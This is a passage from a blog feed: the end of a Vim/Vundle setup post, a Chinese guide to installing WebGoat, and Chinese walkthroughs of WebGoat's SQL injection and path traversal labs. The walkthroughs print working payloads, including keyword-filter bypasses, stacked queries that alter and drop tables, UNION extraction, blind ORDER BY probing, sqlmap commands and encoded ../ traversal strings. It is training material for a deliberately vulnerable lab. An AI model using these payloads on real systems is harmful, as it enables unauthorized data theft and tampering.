class="string">&#x27;flazz/vim-colorschemes&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="keyword">call</span> vundle#end()            <span class="comment">&quot; required</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span>    <span class="comment">&quot; required</span></span><br><span class="line"><span class="comment">&quot; To ignore plugin indent changes, instead use:</span></span><br><span class="line"><span class="comment">&quot;filetype plugin on</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; Brief help</span></span><br><span class="line"><span class="comment">&quot; :PluginList       - lists configured plugins</span></span><br><span class="line"><span class="comment">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="comment">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span></span><br><span class="line"><span class="comment">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="comment">&quot; Put your non-Plugin stuff after this line</span></span><br><span class="line"><span class="comment">&quot; </span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="keyword">syntax</span> enable</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> fdm=marker</span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">8</span> softtabstop=<span class="number">0</span> expandtab <span class="built_in">shiftwidth</span>=<span class="number">4</span> smarttab</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">nu</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Download-Plug-ins"><a href="#Download-Plug-ins" class="headerlink" title="Download Plug-ins"></a>Download Plug-ins</h1><p>Run <code>git clone</code> for each plug-ins, Download them to<code>~/.vim/bundle</code>。<br><img data-src="plugin_download.png"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/VundleVim/</span>Vundle.vim.git ~<span class="regexp">/.vim/</span>bundle/Vundle.vim</span><br><span class="line">cd ~<span class="regexp">/.vim/</span>bundle</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tpope/</span>vim-fugitive</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/altercation/</span>vim-colors-solarized</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Valloric/</span>YouCompleteMe</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/rstacruz/</span>sparkup</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/plasticboy/</span>vim-markdown</span><br></pre></td></tr></table></figure>

<h1 id="Install-Plug-ins"><a href="#Install-Plug-ins" class="headerlink" title="Install Plug-ins"></a>Install Plug-ins</h1><p>Run<strong>Vim</strong>, and then execute<code>:PluginInstall</code>。<br>Alternatively, you can run <code> vim +PluginInstall +qall</code> directly in shell. </p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Vim</category>
      </categories>
      <tags>
        <tag>Configuration</tag>
        <tag>Vim</tag>
        <tag>Vundle</tag>
      </tags>
  </entry>
  <entry>
    <title>WebGoat安装运行步骤</title>
    <url>/zh-CN/a0ebb04/</url>
    <content><![CDATA[<p>WebGoat 是一个由OWASP开发和维护的，专为网络应用安全教学所设计的网络应用靶机。 WebGoat中包含了常见的OWASP Top10漏洞的训练页面。对于有意掌握网络应用安全及渗透测试相关技术的用户来说，这是个非常有效的工具。</p>
<p>这篇文章就简单介绍了如何下载，并在本地运行WebGoat。</p>
<span id="more"></span>


<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>从<a href="https://github.com/WebGoat/WebGoat/releases">WebGoat的Github页面</a>下载最新版。 </p>
<p><img data-src="download.png" alt="下载webgoat-server"></p>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>进入到下载文件的保存目录，执行下述命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar webgoat-server-<span class="number">8</span>.<span class="number">1</span>.<span class="number">0</span>.jar --server.port=<span class="number">9090</span></span><br></pre></td></tr></table></figure>

<p><img data-src="run.png" alt="运行"></p>
<p>服务器成功开始运行后，在浏览器进入<a href="http://localhost:9090/WebGoat">http://localhost:9090/WebGoat</a>页面。就可以看到如下登录界面：</p>
<p><img data-src="main_page.png" alt="WebGoat主页"></p>
<p>选择注册新用户。注册完成后就可以看到挑战页面：</p>
<p><img data-src="main_page_2.png" alt="WebGoat首页"></p>
<p>OK，现在就可以开始挑战了！！冲鸭～</p>
<h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>再次多提醒一句，对于这类网络应用的靶机，由于都是有意地设计成存在漏洞，所以千万不要将其暴露在互联网上。 <strong>请在一个隔离的环境，进行实验。</strong></p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Web Application</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>WebGoat</tag>
      </tags>
  </entry>
  <entry>
    <title>WebGoat Injection 解题思路 （下）</title>
    <url>/zh-CN/aa0b11b6/</url>
    <content><![CDATA[<h1 id="WebGoat-版本信息"><a href="#WebGoat-版本信息" class="headerlink" title="WebGoat 版本信息"></a>WebGoat 版本信息</h1><ul>
<li>WebGoat v8.1.0</li>
</ul>
<h1 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a>SQL Injection (mitigation)</h1><h2 id="1～4-Immutable-Queries"><a href="#1～4-Immutable-Queries" class="headerlink" title="1～4. Immutable Queries"></a>1～4. Immutable Queries</h2><p>介绍了可以防御SQL注入的三种方法：</p>
<ul>
<li>Static Queries 静态查询语句</li>
<li>Parameterized Queries 参数化查询语句</li>
<li>Stored Procedures 储存过程</li>
</ul>
<h2 id="5-Try-it-Writing-safe-code"><a href="#5-Try-it-Writing-safe-code" class="headerlink" title="5. Try it! Writing safe code"></a>5. Try it! Writing safe code</h2><p>填空题！！完成一段可以抵御SQL注入攻击的安全代码。</p>
<p>基本按照第四节中的JAVA代码样例即可：</p>
<p><img data-src="3_0.png"></p>
<h2 id="6-Try-it-Writing-safe-code"><a href="#6-Try-it-Writing-safe-code" class="headerlink" title="6. Try it! Writing safe code"></a>6. Try it! Writing safe code</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tring data;</span><br><span class="line"><span class="type">String</span> <span class="variable">accountID</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(DBURL, DBUSER, DBPW))&#123;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">    statement.setString(<span class="number">1</span>, accountID);</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">    <span class="keyword">if</span> (results != <span class="literal">null</span> &amp;&amp; results.first()) &#123;</span><br><span class="line">       results.last(); <span class="comment">// Only one record should be returned for this query</span></span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">// Handle the error - no records found &#125;</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">    <span class="comment">// Log and handle the SQL Exception &#125;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>


<h2 id="7-Parameterized-Queries-NET"><a href="#7-Parameterized-Queries-NET" class="headerlink" title="7. Parameterized Queries - .NET"></a>7. Parameterized Queries - .NET</h2><p>这里又另外展示了一段.NET中的参数话查询代码</p>
<h2 id="8-Input-Validation-Required"><a href="#8-Input-Validation-Required" class="headerlink" title="8. Input Validation Required?"></a>8. Input Validation Required?</h2><p>简单解释了在使用了正确的方法进行SQL语句的查询之后，用户输入校验为什么依然是必要的。</p>
<h2 id="9-Input-validation-alone-is-not-enough"><a href="#9-Input-validation-alone-is-not-enough" class="headerlink" title="9. Input validation alone is not enough!!"></a>9. Input validation alone is not enough!!</h2><p>如同标题所说的： <strong>单单使用输入校验是不够的</strong>。攻击者总能找到办法针对输入校验进行绕过。这里我们就需要尝试绕过，以此来实现注入。</p>
<p>先简单尝试最普通的注入语句：<code>d&#39; or 1=1 -- </code>。我们可以看到程序进行了输入校验，不接受输入中包含空格。</p>
<p><img data-src="3_9.png"></p>
<p>尝试用空注释符<code>/**/</code>来代替空格：<code>d&#39;/**/or/**/1=1/**/--</code></p>
<p><img data-src="3_9_1.png"></p>
<p>Emmm…答案还是不正确。但是，可以看到，输入的语句已经按照我们所设想的被成功执行了。回忆一下之前相同的一题，好像是要拉去另一张表的内容…</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">d&#x27;;<span class="keyword">SELECT</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>user_system_data--</span><br></pre></td></tr></table></figure>

<p><img data-src="3_9_2.png"></p>
<p>嘿嘿！果然，这下就对了！</p>
<h2 id="10-Input-validation-alone-is-not-enough-2"><a href="#10-Input-validation-alone-is-not-enough-2" class="headerlink" title="10. Input validation alone is not enough!! (2)"></a>10. Input validation alone is not enough!! (2)</h2><p>继续上一题的内容。开发团队在仅使用输入校验这条路上…不撞破南墙不回头了…</p>
<p>先使用上一题的payload进行简单尝试：<code>d&#39;;SELECT/**/*/**/from/**/user_system_data--</code>。果然，得到了报错…</p>
<p><img data-src="3_10_1.png"></p>
<p>仔细看一下最终被执行的SQL命令，不难发现<code>SELECT</code>和<code>from</code>都被系统删除了。那如果输入的时候将<code>SELECT</code>替换为<code>SESELCETLECT</code>会有什么结果呢？</p>
<p>将输入简单修改为：<code>d&#39;;SELSELECTECT/**/*/**/frfromom/**/user_system_data--</code></p>
<p><img data-src="3_10_2.png"></p>
<p>Bingo!!系统删除了一个<code>SELECT</code>，然后又刚好剩下了一个<code>SELECT</code>来完成完整的SQL注入。</p>
<blockquote>
<p>即使要使用这种方法来抵御SQL注入，也要使用递归删除的方法。直到用户输入完全匹配不到关键词列表中的任何一个为止。</p>
</blockquote>
<h2 id="11-Order-by-clause"><a href="#11-Order-by-clause" class="headerlink" title="11. Order by clause"></a>11. Order by clause</h2><p>Prepared Statement可以有效地阻止SQL注入的发生，但这也并不意味着只要使用了这种方式就可以防止所有的SQL注入。这里举例了一种基于<code>Order</code>语句的注入方式。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="literal">TRUE</span>) <span class="keyword">THEN</span> lastname <span class="keyword">ELSE</span> firstname)</span><br></pre></td></tr></table></figure>

<p>将True改为任意判断语句即可通过返回值的排列顺序获取到数据库的信息。</p>
<h2 id="12-SQL-Injection-Through-Order-By-Field"><a href="#12-SQL-Injection-Through-Order-By-Field" class="headerlink" title="12. SQL Injection Through Order By Field"></a>12. SQL Injection Through Order By Field</h2><p>目标是通过对<code>ORDER BY</code>进行注入，进而获取到webgoat-prd服务器的IP地址。</p>
<p>通过Burp截取排序相关的请求，可以通过服务器的报错信息得到相关的表明。</p>
<p><img data-src="3_12.png"></p>
<p>首先将payload修改为<code>(CASE+WHEN+(SELECT+SUBSTRING(ip,1,1)+FROM+servers+where+hostname=&#39;webgoat-prd&#39;)=80+THEN+ip+ELSE+id+END)</code>，看看语法是否正确。由于IP地址的前几位都是数字，所以需要爆破的量并不算多。</p>
<p>首先对IP的第一位进行尝试，使用BurpSuite的Intruder功能。</p>
<p><img data-src="3_12_1.png"></p>
<p>将爆破的值设为数字类型，从0-9。并且简单设置Grep-Payload选项，以此方便我们在结果中进行比对。</p>
<p><img data-src="3_12_2.png"></p>
<p>好了，这样一眼就可以看出来，IP地址的第一位是<code>1</code>。再对第二第三位进行重复操作。这样子，就可以获得IP地址的前三位为<code>104</code>。</p>
<p>提交答案！搞定！</p>
<h2 id="13-Least-Privilege"><a href="#13-Least-Privilege" class="headerlink" title="13. Least Privilege"></a>13. Least Privilege</h2><p>再次强调了最小化权限的重要性。</p>
<h1 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title="Path Traversal"></a>Path Traversal</h1><h2 id="路径-目录-遍历攻击"><a href="#路径-目录-遍历攻击" class="headerlink" title="路径(目录)遍历攻击"></a>路径(目录)遍历攻击</h2><p>另一种非常常见的注入攻击类型。路径遍历攻击利用网站的漏洞，可以获取目标系统根目录之外的非授权访问。</p>
<h2 id="Path-traversal-while-uploading-files"><a href="#Path-traversal-while-uploading-files" class="headerlink" title="Path traversal while uploading files"></a>Path traversal while uploading files</h2><p>这个练习需要利用当前系统中的图片上传功能，将文件上传到不同于默认上传目录的另一个目录中。</p>
<p>由于目标系统是构建在Linux系统上的，所以往往使用的方法都是利用burp，在上传的文件名之前加上<code>../</code>达到跨路径的目的。</p>
<p>首先随意选择一个文件作为头像进行上传，并使用BurpSuite拦截请求。</p>
<p><img data-src="4_2.png"></p>
<p>将文件名修改为：<code>../../../../../../../home/richard/.webgoat-8.1.0/PathTraversal/test2.php.jpg</code>。即先确保返回到文件系统的根目录，再连接上页面上显示的目标路径，确保路径是正确的。</p>
<p>submit！咿呀？？好像不大对头…系统返回的错误信息是：</p>
<p><img data-src="4_2_1.png"></p>
<p>看来文件并没有传到我们相传的地方。再仔细一想，这个路径应该是根据表格中的<code>Full Name</code>项构建的，所以我应该是找错了注入点。这样的话，那就尝试将用户名修改为<code>../test</code>试试看吧～</p>
<p>Bingo！这下对了！</p>
<h2 id="Path-traversal-while-uploading-files-2"><a href="#Path-traversal-while-uploading-files-2" class="headerlink" title="Path traversal while uploading files (2)"></a>Path traversal while uploading files (2)</h2><p>这下进行了一些修改，系统会将输入中的<code>../</code>删除，所以我们要想办法进行绕过。那么先测试一下系统是否递归的删除<code>../</code>了呢？还是只进行了一次匹配？</p>
<p>将Full Name修改为<code>..././test</code>进行尝试。直接成功了…</p>
<h2 id="Path-traversal-while-uploading-files-3"><a href="#Path-traversal-while-uploading-files-3" class="headerlink" title="Path traversal while uploading files (3)"></a>Path traversal while uploading files (3)</h2><p>这次系统对于Full Name进行了完整的校验，所以终于轮到对于文件名进行注入了…</p>
<p>再次尝试类似于在第一步尝试中所做的那样，但是现在我们了解了路径情况，所以只要把文件名前加上<code>../</code>就可以了。</p>
<p><img data-src="4_4.png"></p>
<p>顺利通过！！</p>
<h2 id="Retrieving-other-files-with-a-path-traversal"><a href="#Retrieving-other-files-with-a-path-traversal" class="headerlink" title="Retrieving other files with a path traversal"></a>Retrieving other files with a path traversal</h2><p>这次更换了一个场景。需要通过利用路径遍历漏洞来读取一个名为<code>path-traversal-secret.jpg</code>的图片。</p>
<p>先来看一下这个系统的功能。点击Show random cat picture系统会随机返回一张喵喵的图片。（啊，好可爱…）</p>
<p><img data-src="4_5.png"></p>
<p>先用BurpSuite来截取一下请求，看看有没有什么发现呗。</p>
<p><img data-src="4_5_1.png"></p>
<p>Hmm…没有任何参数，仅仅是调用了random-picture这个页面而已。那就只能再进一步看看Response吧！</p>
<p><img data-src="4_5_2.png"></p>
<p>哦？！在系统响应回来的页面里，我看到了这么一行：<code>Location: /PathTraversal/random-picture?id=2.jpg</code>。好家伙！这个页面同样接受<code>id</code>参数，并且这个参数的值直接是文件名的…</p>
<p>那就不客气了呗，直接请求 <a href="http://localhost:9090/WebGoat/PathTraversal/random-picture?id=path-traversal-secret.jpg">http://localhost:9090/WebGoat/PathTraversal/random-picture?id=path-traversal-secret.jpg</a> 这个页面去咯！</p>
<p>嗷呜！失败了！直接是一个400。那就改一下参数:<code>id=2.jpg</code>试试看。</p>
<p><img data-src="4_5_3.png"></p>
<p>原来<code>.jpg</code>系统是自动添加的。不过同时还有额外收获，我们看到了当路径不存在时，系统会列出当前路径中的文件，而且当前路径中并没有我们想要找的<code>path-traversal-secret.jpg</code>。</p>
<p>那么尝试<code>id=../</code>返回上级菜单试试？</p>
<p><img data-src="4_5_4.png"></p>
<p>提示参数中不接受非法字符，于是乎尝试将<code>../</code>进行URL编码：<code>id=%2E%2E%2F</code>。这下我们终于看到了列出的目录，但是并没有我们想找的图片。再试着多返回一级！终于有发现了！！</p>
<p><img data-src="4_5_5.png"></p>
<p>这下就离成功不远了！！<code>id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret</code>访问这个页面，终于看到提示：密钥就是用户名的SHA-512的值。</p>
<p><img data-src="4_5_6.png"></p>
<p>最后计算一下哈希值，提交一下就好了。</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">┌──<span class="params">(richard㉿richard-Kali)</span>-[~<span class="string">/Tools/Forensics</span>]</span><br><span class="line">└─$ <span class="keyword">echo</span> -ne &#x27;pentester&#x27; | sha512sum</span><br><span class="line">f167e76e501a479aa05b927d6dc9e05de8d66a8ebffd411e24dd30ef1e435deec8478a819<span class="keyword">cd</span>26d1a1eda2fb3a1c18fafeff64b536bc351265b09<span class="keyword">cd</span>99e967d787  -</span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Security</category>
        <category>Web Application</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>WebGoat</tag>
        <tag>OWASP Top10</tag>
        <tag>SQLMap</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>WebGoat Injection 解题思路 （上）</title>
    <url>/zh-CN/3dea2b22/</url>
    <content><![CDATA[<h1 id="WebGoat-版本信息"><a href="#WebGoat-版本信息" class="headerlink" title="WebGoat 版本信息"></a>WebGoat 版本信息</h1><ul>
<li>WebGoat v8.1.0</li>
</ul>
<h1 id="A1-Injection-注入"><a href="#A1-Injection-注入" class="headerlink" title="(A1) Injection 注入"></a>(A1) Injection 注入</h1><h2 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a>SQL Injection (intro)</h2><h3 id="1-Concept"><a href="#1-Concept" class="headerlink" title="1 - Concept"></a>1 - Concept</h3><p>介绍SQL的基本概念，仔细阅读即可。</p>
<h3 id="2-What-is-SQL"><a href="#2-What-is-SQL" class="headerlink" title="2 - What is SQL?"></a>2 - What is SQL?</h3><p>简单了解SQL语句。测试如何使用 <strong>SELECT语句</strong>进行查询。<br>这个非常简单：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> department <span class="keyword">from</span> employees <span class="keyword">where</span> userid=<span class="number">96134</span></span><br></pre></td></tr></table></figure>

<h3 id="3-DML"><a href="#3-DML" class="headerlink" title="3 - DML"></a>3 - DML</h3><p>SQL语句除去SELECT查询之外，还有Insert, Update等添加、修改数据的操作。</p>
<p>测试内容为将<code>Tobi Barnett</code>的部门修改为<code>Sales</code>。这个也相对容易：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Update</span> employees <span class="keyword">set</span> department = <span class="string">&#x27;Sales&#x27;</span> <span class="keyword">where</span> userid = <span class="number">89762</span></span><br></pre></td></tr></table></figure>

<h3 id="4-DDL"><a href="#4-DDL" class="headerlink" title="4 - DDL"></a>4 - DDL</h3><p>这一节介绍了如何使用SQL语句修改数据库中表的结构。测试内容是为<code>employees</code>表添加一个名为<code>phone</code>的列，数据类型为<code>varchar(20)</code>。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> phone <span class="type">varchar</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<h3 id="5-DCL"><a href="#5-DCL" class="headerlink" title="5 - DCL"></a>5 - DCL</h3><p>这一节的内容是通过SQL语言管理用户进入及操作数据库的权限。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> UnauthorizedUser</span><br></pre></td></tr></table></figure>

<p>到此为止，就完成了对于SQL语句的初步认识与学习。如果对于SQL语言的其他操作还存在什么问题的话，可以在<a href="https://www.w3schools.com/sql/default.asp">w3school SQL</a>进行学习。</p>
<h3 id="6-amp-7-amp-8-What-is-SQL-injection"><a href="#6-amp-7-amp-8-What-is-SQL-injection" class="headerlink" title="6 &amp; 7 &amp; 8 - What is SQL injection?"></a>6 &amp; 7 &amp; 8 - What is SQL injection?</h3><p>这几节介绍了SQL注入的基本原理，可能产生的影响以及SQL注入的严重性。如果之前对于 <strong>SQL注入</strong> 已经有了基本的了解，那么这一步可以简单跳过。 如果对于 <strong>SQL注入</strong> 还没有任何的概念，请务必仔细阅读这里的内容。</p>
<p>这三节没有任何交互性的内容。</p>
<h3 id="9-Try-It"><a href="#9-Try-It" class="headerlink" title="9 - Try It!"></a>9 - Try It!</h3><p>最最基本的注入结构。明文测试来感受一下如何构造一个成功的SQL注入语句。</p>
<p><img data-src="1_1_9.png" alt="Try It!"></p>
<h3 id="10-Numeric-SQL-Injection"><a href="#10-Numeric-SQL-Injection" class="headerlink" title="10 - Numeric SQL Injection"></a>10 - Numeric SQL Injection</h3><p>稍微提高了一些难度。SQL语句从页面接受了两个不同的用户输入，但是其中只有一个可以成功进行SQL注入。我们需要找到正确的输入域，并利用。</p>
<p>先简单尝试：<br><img data-src="1_1_10.png" alt="10"></p>
<p>看到了错误提示为： 无法成功将Login_Count的值解析为数字。</p>
<p>所以再次尝试对User_id的值进行注入：</p>
<p><img data-src="1_1_10_1.png" alt="Success!"></p>
<h3 id="11-String-SQL-Injection"><a href="#11-String-SQL-Injection" class="headerlink" title="11 - String SQL Injection"></a>11 - String SQL Injection</h3><p>类似于第9个小测试的内容。只不过这次不再是选择题了。在<code>Employee Name</code>的输入框输入：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<p><img data-src="1_1_11.png"></p>
<h3 id="12-Compromising-Integrity-with-Query-chaining"><a href="#12-Compromising-Integrity-with-Query-chaining" class="headerlink" title="12 - Compromising Integrity with Query chaining"></a>12 - Compromising Integrity with Query chaining</h3><p>同样的输入框。但这次不同于之前的仅仅是获取到全部员工的列表信息，这次我们需要真真切切地做些坏事了。这个挑战的要求是，将数据库中自己的工资修改为最高。</p>
<p>思路是使用分号分隔两句SQL语句，并在第二句使用UPDATE命令对数据进行更新。因此，我们可以在<code>Employee Name</code>的输入框输入：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1; <span class="keyword">Update</span> employees <span class="keyword">SET</span> SALARY=<span class="number">99999</span> <span class="keyword">where</span> AUTH_TAN=<span class="number">3</span>SL99A --</span><br></pre></td></tr></table></figure>

<p>OK,顺利让自己的工资变成最高了！！（千万别在真实的生产环境中做同样的事情！！）</p>
<p><img data-src="1_1_11.png"></p>
<h3 id="13-Compromising-Availability"><a href="#13-Compromising-Availability" class="headerlink" title="13 - Compromising Availability"></a>13 - Compromising Availability</h3><p>题目要求在<code>access_log</code>表中删除被系统记录下的SQL语句执行记录。</p>
<p>与上一题思路相同，再第二句SQL语句中执行 <strong>DROP</strong> 命令，删除<code>access_log</code>表中的数据。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">d</span>&#x27;; <span class="keyword">drop</span> <span class="keyword">TABLE</span> access_log --</span><br></pre></td></tr></table></figure>

<p>成功！</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这一小节介绍了SQL注入中一些最为基础的概念。并通过一个比较真实的场景，来展现了一个攻击者在面对一个存在漏洞的系统时，可以实现哪些操作。</p>
<p>当然，由于这一部分主要是面对刚刚入门的初学者，为了更好的实现展示的目的，所以这一部分中的漏洞非常的显而易见，也非常容易利用。而在实际的生产环境中，大多数的漏洞并不是那么简单地就能被利用。下一节就要尝试更困难的挑战了！</p>
<h2 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a>SQL Injection (advanced)</h2><h3 id="Challenge-1-2"><a href="#Challenge-1-2" class="headerlink" title="Challenge 1,2"></a>Challenge 1,2</h3><p>这两节简单得介绍了SQL注入实操的一些基本技巧。这些技巧其实非常有用，虽然我们可以使用SQL Map这类的工具来帮助我们完成一些自动化的SQL注入操作，但是对于基本原理的理解可以让你最大化发挥出工具的价值。</p>
<h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><p>这里需要通过SQL注入获取数据库中表的完整信息，而且这次我们已经不满足于获得当前的数据表。我们还需要同时获取另一张表中的内容。这里我们可以使用<code>UNION SELECT</code>语句来实现两张表的数据拼接：</p>
<p><code>d&#39; and 1=2 UNION SELECT user_system_data.*,NULL,NULL,NULL from user_system_data --</code></p>
<p>这里需要注意的有两点：  </p>
<ul>
<li>使用UNION SELECT 需要前后两张表的列数相匹配。由于题目中已知的信息告诉我们<code>user_system_data</code>中只有4列数据，所以我们需要手动填充3列<code>NULL</code>。</li>
<li>一开始写的是<code>UNION SELECT *</code>,结果可以看到报错为: <code>duplicate column name in derived table</code>。不难理解，两张表中都有<code>userid</code>列，而第二张表的<code>userid</code>还是主键。所以我们需要在<code>*</code>前指定表名。</li>
</ul>
<p><img data-src="1_2_3.png"></p>
<p>根据正确答案提示，这道题还可以直接拼接SQL语句。这个实现起来就更简单了：</p>
<p><code> d&#39;; SELECT * from user_system_data</code> </p>
<p><img data-src="1_2_3_1.png"></p>
<p>输入Dave的密码： <code>passW0rD</code> 最终完成。 </p>
<h3 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h3><p>这边介绍了SqL盲注。之前的挑战中，页面上会返回完整的信息，包括了数据库的报错信息还有完整的查询结果。但在现实的环境中，大多数的情况是，数据库仅会返回查询是成功还是失败。在这种情况下，我们每次可以从数据库获得的信息会大大减少，这也很大程度增加了注入的难度。</p>
<p>这一节的说明简要解释了两种最常见的盲注方法： <strong>基于内容的盲注</strong> 和 <strong>基于时间的盲注</strong> </p>
<h3 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h3><p>来吧，亲自尝试一下！！</p>
<p>这里我们看到了一个最为常见的功能：登录与注册。我们需要最终以Tom的身份登录进系统。</p>
<p><img data-src="1_2_5.png"></p>
<p>简单尝试使用SQL注入绕过登录，发现失败了。然后尝试在Register功能中注入。</p>
<p><img data-src="1_2_5_1.png"></p>
<p>可以看到系统会返回说用户已经存在的消息。尝试简单修改用户名，快速检验是否存在注入的可能：</p>
<p><code>tom&#39; and 1=1 -- </code></p>
<p>系统返回了以下信息：</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">User <span class="comment">&#123;0&#125;</span> already exists please <span class="keyword">try</span> <span class="keyword">to</span> <span class="keyword">register</span> <span class="keyword">with</span> a different username.</span><br></pre></td></tr></table></figure>

<p>这个<code>&#123;0&#125;</code>看着颇为可疑…感觉可能是个能够利用的点。使用BurpSuite截取请求：</p>
<p><img data-src="1_2_5_2.png"></p>
<p>将请求保存到本地文件，并使用<code>sqlmap -r webgoat_1.2.5_register.txt</code>对这个请求进行SQL注入的测试。</p>
<p><img data-src="1_2_5_3.png"></p>
<p>很显然，<code>username_reg</code>这个参数存在SQL注入的漏洞。因此，我们进一步利用 <strong>SQL Map</strong> 来通过这个注入点，获取更多数据库信息。基于上一次运行的结果，我们使用下列命令来列出数据库中所有的DB列表：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.<span class="number">2.5</span>_register<span class="selector-class">.txt</span> <span class="attr">--dbms</span>=HSQLDB <span class="attr">--thread</span> <span class="number">5</span> <span class="attr">--dbs</span> <span class="attr">--no-cast</span> <span class="attr">--technique</span>=B</span><br></pre></td></tr></table></figure>

<p><img data-src="1_2_5_4.png"></p>
<p>我们获取到了5个数据库。再指定数据库为<code>PUBLIC</code>获取该数据中所有的表名。同时我们注意到，这个时候执行的速度明显减慢了很多，所以我们可以在参数中加入<code>--string=&quot;already exists please try to register with a different username&quot;</code>指定查询为真的条件。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.<span class="number">2.5</span>_register<span class="selector-class">.txt</span> <span class="attr">--string</span>=<span class="string">&quot;already exists please try to register with a different username&quot;</span> <span class="attr">--dbms</span>=HSQLDB <span class="attr">--thread</span> <span class="number">10</span> <span class="attr">--technique</span>=B -D PUBLIC <span class="attr">--tables</span></span><br></pre></td></tr></table></figure>

<p><img data-src="1_2_5_5.png"></p>
<p>成功获取到所有的表名。其中<code>SQL_CHALLENGE_USERS</code>看着就非常像我们需要获取信息的表。尝试直接下载这张表里的内容：</p>
